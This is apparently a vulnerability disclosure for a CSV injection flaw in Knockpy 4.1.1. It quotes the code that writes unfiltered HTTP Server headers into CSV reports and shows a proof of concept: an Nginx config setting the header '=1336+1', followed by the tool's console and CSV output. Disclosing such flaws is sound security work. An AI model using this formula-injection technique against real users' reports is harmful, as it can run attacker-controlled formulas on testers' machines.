@@ -1,0 +1,55 @@
+# Exploit Title: Knockpy 4.1.1 - CSV Injection
+# Author: Dolev Farhi
+# Date: 2020-12-29
+# Vendor Homepage: https://github.com/guelfoweb/knock
+# Version : 4.1.1
+# Tested on: Debian 9.13
+
+Knockpy, as part of its subdomain brute forcing flow of a remote domain, issues a HEAD request to the server to fetch details such as headers, status code, etc.
+The data then gets reflected when issuing the -c flag to store as a CSV file with the Server HTTP Response Header unfiltered.
+
+Vulnerable code segment(s)
+
+# knockpy.py
+
+# row = ip+'\t'+str(data['status'])+'\t'+'host'+'\t'+str(data['hostname'])+get_tab(data['hostname'])+str(server_type)
+# subdomain_csv_list.append(ip+','+str(data['status'])+','+'host'+','+str(data['hostname'])+','+str(server_type))
+
+# modules/save_report.py
+
+# if fields:
+#  csv_report += 'ip,status,type,domain_name,server\n'
+# for item in report:
+#  csv_report += item + '\n'
+# report = csv_report
+
+
+1. Example malicious Nginx config to return CSV formula headers:
+
+http {
+...    
+  server_tokens off;
+  more_set_headers 'Server: =1336+1';
+...
+}
+
+2. Tester runs Knoockpy
+root@host:~/# python knockpy/knockpy.py -c test.local
+
++ checking for virustotal subdomains: SKIP
+	VirusTotal API_KEY not found
++ checking for wildcard: NO
++ checking for zonetransfer: NO
++ resolving target: YES
+- scanning for subdomain...
+
+Ip Address	Status	Type	Domain Name			Server
+----------	------	----	-----------			------
+127.0.0.1       200     host    appserver.test.local		=1336+1
+
+
+CSV result
+
+root@host:~/# cat test_local.csv
+127.0.0.1,200,host,appserver.test.local,=1336+1
+127.0.0.1,200,host,www.test.local,=1336+1
